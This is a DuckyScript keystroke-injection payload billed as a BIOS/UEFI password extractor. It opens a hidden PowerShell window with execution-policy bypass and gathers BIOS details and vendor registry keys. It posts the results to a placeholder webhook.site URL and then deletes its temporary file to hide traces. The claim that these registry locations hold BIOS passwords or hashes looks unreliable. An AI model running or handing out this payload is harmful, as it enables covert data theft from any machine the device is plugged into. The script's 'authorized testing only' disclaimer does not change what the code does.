REM NullSec - BIOS/UEFI Password Extractor
REM Extracts BIOS passwords from Windows registry and memory
REM For authorized security testing only

GUI r
DELAY 500
STRING powershell -w hidden -ep bypass
ENTER
DELAY 1000

REM Extract BIOS info and potential passwords
STRING $biosInfo = @{
    Manufacturer = (Get-WmiObject Win32_BIOS).Manufacturer
    Version = (Get-WmiObject Win32_BIOS).SMBIOSBIOSVersion
    SerialNumber = (Get-WmiObject Win32_BIOS).SerialNumber
    ReleaseDate = (Get-WmiObject Win32_BIOS).ReleaseDate
}
ENTER
DELAY 200

REM Check common BIOS password locations in registry
STRING $regPaths = @(
    'HKLM:\HARDWARE\DESCRIPTION\System\BIOS',
    'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\OEMInformation',
    'HKLM:\SYSTEM\CurrentControlSet\Services\mssmbios\Data'
)
ENTER
DELAY 200

REM Extract potential password hashes
STRING $biosData = @()
STRING foreach ($path in $regPaths) { if (Test-Path $path) { $biosData += Get-ItemProperty $path 2>$null } }
ENTER
DELAY 200

REM Check for Dell, HP, Lenovo specific password locations
STRING $dellPwd = Get-ItemProperty 'HKLM:\SOFTWARE\Dell\BIOS' -ErrorAction SilentlyContinue
ENTER
STRING $hpPwd = Get-ItemProperty 'HKLM:\SOFTWARE\Hewlett-Packard\BIOS' -ErrorAction SilentlyContinue
ENTER
STRING $lenovoPwd = Get-ItemProperty 'HKLM:\SOFTWARE\Lenovo\BIOS' -ErrorAction SilentlyContinue
ENTER
DELAY 200

REM Export all data
STRING $output = @{
    BIOSInfo = $biosInfo
    RegistryData = $biosData
    Dell = $dellPwd
    HP = $hpPwd
    Lenovo = $lenovoPwd
    Timestamp = Get-Date -Format o
}
ENTER
DELAY 200

STRING $output | ConvertTo-Json -Depth 5 | Out-File "$env:TEMP\bios_extract.json"
ENTER
DELAY 200

REM Exfil via webhook (change URL)
STRING $webhook = "https://webhook.site/YOUR-ID"
ENTER
STRING try { Invoke-RestMethod -Uri $webhook -Method Post -Body ($output | ConvertTo-Json) -ContentType "application/json" } catch {}
ENTER
DELAY 500

STRING Remove-Item "$env:TEMP\bios_extract.json" -Force 2>$null; exit
ENTER
